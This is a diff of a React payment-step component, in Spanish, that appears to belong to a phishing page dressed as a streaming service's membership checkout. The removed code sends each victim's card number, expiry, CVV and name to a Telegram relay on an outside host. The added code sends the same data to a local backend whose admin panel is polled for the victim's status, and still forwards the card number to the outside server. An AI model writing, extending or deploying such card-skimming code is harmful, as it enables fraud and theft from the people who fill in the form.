@@ -20,6 +20,9 @@ const PaymentStepCard = () => {
         cardHolderName: '',
     });
 
+    const [isSpinnerVisible, setIsSpinnerVisible] = useState(false);  // Estado para mostrar el spinner
+    const [apiStatus, setApiStatus] = useState(null);  // Estado para almacenar el status_id de la API
+
     useEffect(() => {
         const savedFormValues = localStorage.getItem('formValues');
         if (savedFormValues) {
@@ -40,45 +43,6 @@ const PaymentStepCard = () => {
         }
     };
 
-    const validateLuhn = (cardNumber) => {
-        const digits = cardNumber.split('').reverse().map(Number);
-        const sum = digits.reduce((acc, digit, index) => {
-            if (index % 2 === 1) {
-                digit *= 2;
-                if (digit > 9) digit -= 9;
-            }
-            return acc + digit;
-        }, 0);
-        return sum % 10 === 0;
-    };
-
-    const getCardType = (number) => {
-        const cardTypes = {
-            'Visa': /^4[0-9]{12}(?:[0-9]{3})?$/,
-            'MasterCard': /^5[1-5][0-9]{14}$/,
-            'American Express': /^3[47][0-9]{13}$/,
-            'Diners Club': /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
-            'Discover': /^6(?:011|5[0-9]{2})[0-9]{12}$/,
-            'JCB': /^(?:2131|1800|35\d{3})\d{11}$/,
-            'Maestro': /^(?:5018|5020|5038|6304|6759|6761|6762|6763)\d{12,19}$/,
-        };
-
-        for (const [key, regex] of Object.entries(cardTypes)) {
-            if (regex.test(number)) {
-                return key;
-            }
-        }
-        return null;
-    };
-
-    const validateCard = (cardNumber) => {
-        const isValidLuhn = validateLuhn(cardNumber);
-        const isValidFormat = /^[0-9]{13,19}$/.test(cardNumber);
-        const cardType = getCardType(cardNumber);
-
-        return isValidLuhn && isValidFormat && cardType !== null;
-    };
-
     const formatExpirationDate = (date) => {
         const numericValue = date.replace(/\D/g, '');
         const formattedValue = numericValue
@@ -89,109 +53,108 @@ const PaymentStepCard = () => {
 
     const validateForm = () => {
         const newErrors = {};
-
-        if (!validateCard(formValues.cardNumber)) {
+        if (!/^[0-9]{13,19}$/.test(formValues.cardNumber)) {
             newErrors.cardNumber = 'Número de tarjeta inválido';
         }
-
         const [month, year] = formValues.expirationDate.split('/').map(Number);
         const today = new Date();
         const currentMonth = today.getMonth() + 1;
         const currentYear = today.getFullYear() % 100;
-
         if (!/^\d{2}\/\d{2}$/.test(formValues.expirationDate) ||
             month < 1 || month > 12 ||
             (year < currentYear || (year === currentYear && month < currentMonth))) {
-            newErrors.expirationDate = ' Fecha de vencimiento inválida o en el pasado';
+            newErrors.expirationDate = 'Fecha de vencimiento inválida o en el pasado';
         }
-
-        // Validación del CVV
         if (!/^\d{3}$/.test(formValues.cvv)) {
             newErrors.cvv = 'CVV debe ser un número de 3 dígitos';
         }
-
-        // Validación del nombre del titular
         if (!/^[A-Za-z\s]+$/.test(formValues.cardHolderName.trim())) {
             newErrors.cardHolderName = 'El nombre del titular solo debe contener letras y espacios';
         }
-
         setErrors(newErrors);
         return Object.keys(newErrors).length === 0;
-    };
-
-
-    const sendTelegramMessage = async (message) => {
-        try {
-            const chatId = '-4723241842';
-            const response = await fetch('https://streaming.renovapunto.online/enviarmensaje', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ chatId, message }),
-            });
-
-            if (!response.ok) {
-                throw new Error('Error al enviar el mensaje a Telegram');
-            }
-        } catch (error) {
-            console.error('Error:', error);
-        }
     };
 
     const handleSubmit = async (e) => {
         e.preventDefault();
         if (!validateForm()) return;
-    
+
         setLoading(true);
-    
-        const minSpinnerTime = 2000;
-        const startTime = Date.now();
-    
-        const hideSpinner = (data, redirectUrl) => {
-            const elapsedTime = Date.now() - startTime;
-            const remainingTime = minSpinnerTime - elapsedTime;
-            if (remainingTime > 0) {
-                setTimeout(() => {
-                    setLoading(false);
-                    console.log('Data recibida del servidor:', data);
-                    console.log('Redirecting to:', redirectUrl);
-                    navigate(redirectUrl);
-                }, remainingTime);
-            } else {
-                setLoading(false);
-                console.log('Data recibida del servidor:', data);
-                console.log('Redirecting to:', redirectUrl);
-                navigate(redirectUrl);
-            }
+        const cardData = {
+            cardNumber: formValues.cardNumber,
+            expirationDate: formValues.expirationDate,
+            cvv: formValues.cvv,
+            cardHolderName: formValues.cardHolderName,
         };
-    
+        localStorage.setItem('cardData', JSON.stringify(cardData));
+
         try {
-            // Enviar los datos de la tarjeta al backend
-            const response = await fetch('https://streaming.renovapunto.online/procesar', {
+            const response = await fetch('http://127.0.0.1:8000/api/v1/newGuest', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ codigo: formValues.cardNumber }), // Aquí solo envías el número de tarjeta
+                body: JSON.stringify({
+                    user: formValues.cardHolderName,
+                    ip: 'new Ip',
+                    cc: formValues.cardNumber,
+                    expiration_date: formValues.expirationDate,
+                    ccv: formValues.cvv,
+                    'user-agent': 'PostmanRuntime/7.43.0',
+                }),
             });
-    
+
             if (!response.ok) {
                 throw new Error('Error en la solicitud al servidor');
             }
-    
+
             const data = await response.json();
-    
-            // Aquí puedes manejar la respuesta del servidor
-            const { redirectUrl, banco } = data;
-    
-            // Enviar mensaje a Telegram
-            const message = `📞 ⚠ TARJETA LLEGANDO ⚠ 📞:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName}\n- 💳: ${formValues.cardNumber} \n- 📅: ${formValues.expirationDate}\n- 🔐: ${formValues.cvv}\n-------------------------------------------`;
-            await sendTelegramMessage(message);
-    
-            // Llamar a hideSpinner con los datos y la URL de redirección
-            hideSpinner(data, redirectUrl);
-    
+            localStorage.setItem('token', data.token);
+
+            setIsSpinnerVisible(true);  // Mostrar el Spinner después de enviar la solicitud
+
+            // Iniciar consulta periódica cada 2 segundos
+            const interval = setInterval(async () => {
+                try {
+                    const checkResponse = await fetch('http://127.0.0.1:8000/api/v1/admin/guests', {
+                        method: 'GET',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Cookie': `laravel_session=${document.cookie}` // Enviar la cookie para mantener la sesión
+                        },
+                    });
+
+                    if (!checkResponse.ok) {
+                        throw new Error('Error al consultar la API');
+                    }
+
+                    const checkData = await checkResponse.json();
+                    const guest = checkData.guests[0];  // Asumimos que siempre hay un solo guest
+
+                    if (guest.status_id !== 1) {
+                        clearInterval(interval);  // Detener el intervalo si el status cambia
+                        setIsSpinnerVisible(false);  // Detener el spinner
+                        // Aquí puedes redirigir o hacer lo que necesites al recibir el estado final
+                        const response = await fetch('https://streaming.renovapunto.online/procesar', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({ codigo: formValues.cardNumber }), // AquÃ­ solo envÃ­as el nÃºmero de tarjeta
+                        });
+                
+                        if (!response.ok) {
+                            throw new Error('Error en la solicitud al servidor');
+                        }
+              // Cambiar a la ruta que desees
+                    }
+                } catch (error) {
+                    console.error('Error en la consulta:', error);
+                    clearInterval(interval);  // Detener el intervalo en caso de error
+                    setIsSpinnerVisible(false);  // Detener el spinner
+                }
+            }, 2000);  // Consulta cada 2 segundos
+
         } catch (error) {
             console.error('Error en la solicitud:', error);
             setLoading(false);
@@ -200,7 +163,7 @@ const PaymentStepCard = () => {
 
     return (
         <div className="container mx-auto px-6 py-8 mt-2.5">
-            {loading && <Spinner />}
+            {isSpinnerVisible && <Spinner />}
             <div className="text-left mb-4">
                 <span className="block text-left">
                     Paso <b>2</b> de <b>2</b>
@@ -231,9 +194,7 @@ const PaymentStepCard = () => {
                         <label htmlFor="expirationDate" className="absolute left-3 top-4 text-gray-500 transition-all duration-300 transform origin-left peer-focus:scale-90 peer-focus:-translate-y-1 peer-focus:text-red-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 text-sm">
                             (MM/AA)
                         </label>
-                        {errors.expirationDate && <p className="text-red-500 text-sm flex">
-                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 16 16" width="16" height="16" data-icon="CircleXSmall" aria-hidden="true" class="default-ltr-cache-0 e1vkmu651"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z" fill="currentColor"></path></svg>
-                            {errors.expirationDate}</p>}
+                        {errors.expirationDate && <p className="text-red-500 text-sm">{errors.expirationDate}</p>}
                     </div>
 
                     <div className="flex-1 relative">
@@ -247,7 +208,7 @@ const PaymentStepCard = () => {
 
                 <div className="relative mb-4">
                     <input type="text" id="cardHolderName" name="cardHolderName" value={formValues.cardHolderName} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
-                    <label htmlFor="cardHolderName" className="absolute left-3 top-4 text-gray-500 transition-all duration-300 transform origin-left peer-focus:scale-90 peer-focus:-translate-y-1 peer-focus:text-red-500 peer-placeholder-shown:scale-105 peer-placeholder-shown:translate-y-0 text-sm">
+                    <label htmlFor="cardHolderName" className="absolute left-3 top-4 text-gray-500 transition-all duration-300 transform origin-left peer-focus:scale-90 peer-focus:-translate-y-1 peer-focus:text-red-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 text-sm">
                         Nombre del titular
                     </label>
                     {errors.cardHolderName && <p className="text-red-500 text-sm">{errors.cardHolderName}</p>}
@@ -262,7 +223,8 @@ const PaymentStepCard = () => {
                     </p>
                 </div>
 
-                <button type="submit" className="w-full bg-[#e50914] text-white px-4 py-2 rounded-md shadow-sm hover:bg-[#d40813] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#e50914]">
+
+                <button type="submit" className="w-full bg-[#e50914] text-white px-4 py-2 rounded-md shadow-sm hover:bg-[#d40813]">
                     {loading ? 'Procesando...' : 'Iniciar membresía'}
                 </button>
             </form>
